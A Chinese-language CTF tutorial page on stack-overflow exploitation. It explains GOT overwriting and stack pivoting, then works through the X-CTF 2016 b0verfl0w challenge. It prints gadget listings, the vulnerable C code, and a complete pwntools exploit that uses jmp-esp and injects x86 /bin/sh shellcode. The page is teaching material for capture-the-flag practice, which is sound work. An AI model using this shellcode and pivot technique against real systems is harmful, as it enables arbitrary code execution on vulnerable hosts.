#  其它栈溢出技巧

# hijack GOT

## 原理

在目前的C程序中，libc中的函数都是通过GOT表来跳转的。此外，在 没有开启RELRO保护的前提下，每个libc的函数对应的GOT表项是可以被修改的，因此，我们可以修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。比如说我们可以修改printf的got表项内容为system函数的got表项内容，从而在执行printf的时候实际执行的是system函数。假设我们将函数A的地址覆盖为函数B的地址，这一攻击技巧可以分为以下步骤

- 确定函数A的GOT表地址。

  - 这一步我们利用的函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找。

- 确定函数B的内存地址

  - 这一步通常来说，需要我们自己想办法来泄露对应函数B的地址

- 将函数B的内存地址写入到函数A的GOT表地址处。

  - 这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种

    - 写入函数：write函数。
    - ROP

    ```text
    pop eax; ret; 			# printf@got -> eax
    pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
    add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
    ```


# stack privot

## 原理

stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处。然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot

- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞

此外，利用stack privot有以下几个要求

- 可以控制程序执行流。

- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是

  ```assembly
  pop rsp/esp
  ```

  当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。

  ```assembly
  gef➤  x/7i 0x000000000040061a
     0x40061a <__libc_csu_init+90>:	pop    rbx
     0x40061b <__libc_csu_init+91>:	pop    rbp
     0x40061c <__libc_csu_init+92>:	pop    r12
     0x40061e <__libc_csu_init+94>:	pop    r13
     0x400620 <__libc_csu_init+96>:	pop    r14
     0x400622 <__libc_csu_init+98>:	pop    r15
     0x400624 <__libc_csu_init+100>:	ret    
  gef➤  x/7i 0x000000000040061d
     0x40061d <__libc_csu_init+93>:	pop    rsp
     0x40061e <__libc_csu_init+94>:	pop    r13
     0x400620 <__libc_csu_init+96>:	pop    r14
     0x400622 <__libc_csu_init+98>:	pop    r15
     0x400624 <__libc_csu_init+100>:	ret
  ```

  此外，还有更加高级的fake frame。


- 存在可以控制内容的内存，一般有如下
  - bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。
  - heap。但是这个需要我们能够泄露堆地址。

## 示例

### 例1

这里我们以**X-CTF Quals 2016 - b0verfl0w**为例，进行介绍。首先，查看程序的安全保护，如下

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞

```C
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下

- 利用栈溢出布置shellcode
- 控制eip指向shellcode处

第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。

```assembly
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```

这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下

```text
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

那么我们payload中的最后一部分改如何设置esp呢，可以知道

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

所以我们最后一段需要执行的指令就是

```assembly
sub 0x28,esp
jmp esp
```

所以最后的exp如下

```python
from pwn import *
sh = process('./b0verfl0w')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

### 例2-转移堆

待。

## 题目

- EkoPartyCTF 2016 fuckzing-exploit-200

# fake frame